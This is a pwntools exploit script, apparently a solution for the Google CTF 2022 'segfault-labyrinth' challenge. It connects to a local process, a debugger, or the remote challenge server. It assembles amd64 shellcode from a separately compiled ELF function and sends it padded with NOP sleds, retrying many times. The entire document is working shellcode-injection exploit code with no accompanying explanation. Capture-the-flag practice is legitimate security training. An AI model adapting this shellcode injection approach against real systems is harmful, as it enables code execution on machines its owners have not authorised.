from pwn import *

elf = ELF('./challenge')
payload_elf = ELF("./solve")
context.arch = elf.arch
context.binary = elf

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b ",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("segfault-labyrinth.2022.ctfcompetition.com", 1337)
	else:
		return process(elf.path, env=env)

for i in range(0x1000):
	p = get_conn()
	r = lambda x: p.recv(x)
	ra = lambda: p.recvall()
	rl = lambda: p.recvline(keepends=True)
	ru = lambda x: p.recvuntil(x, drop=True)
	sl = lambda x: p.sendline(x)
	sa = lambda x, y: p.sendafter(x, y)
	sla = lambda x, y: p.sendlineafter(x, y)
	ia = lambda: p.interactive()
	li = lambda s: log.info(s)
	lw = lambda s: log.warn(s)
	cl = lambda: p.clean()

	shellcode = b''
	shellcode += asm(shellcraft.amd64.mov('rsp','rdi'))
	shellcode += asm('sub rsp, 0x900')
	# shellcode += b'\xcc'

	walk_func = payload_elf.functions['shellcode']
	walk_func_bytes = payload_elf.read(walk_func.address, walk_func.size)
	shellcode += walk_func_bytes

	print(len(shellcode))

	sa(b'Welcome to the Segfault Labyrinth\n', p64(4050))
	p.send(b'\x90'*10 + shellcode + b'\x90'*5000)

	# ia()
	print(p.clean(1))
	p.close()
